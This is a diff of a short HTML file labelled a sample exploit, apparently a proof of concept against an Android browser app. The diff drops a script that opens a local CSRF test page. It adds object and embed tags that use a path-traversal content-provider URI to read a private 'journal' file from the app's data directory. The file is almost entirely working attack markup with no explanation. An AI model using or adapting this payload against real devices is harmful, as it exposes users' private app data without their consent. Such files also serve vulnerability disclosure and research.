@@ -1,11 +1,8 @@
 <html>
   <h1>Hello this is a sample exploit ! </h1>
   <body>
-      <script>
-        function NewTab() {
-            window.open("file://storage/emulated/0/Pictures/csrf_poc1.html",
-                    "", "width=300, height=300");
-        }
-    </script>
+     <object id="ObjAlertePageLogin" width="300" height="100" type="text/plain" data="blob:content://com.talpa.hibrowser.fileProvider/external_files/../../../../../../../../../storage/emulated/0/Android/data/com.talpa.hibrowser/files/images/journal" border="0" style="overflow: hidden;"> 
+    <embed src="blob:content://com.talpa.hibrowser.fileProvider/external_files/../../../../../../../../../storage/emulated/0/Android/data/com.talpa.hibrowser/files/images/journal" type="text/plain" />
+    </object>
    </body>
 </html>
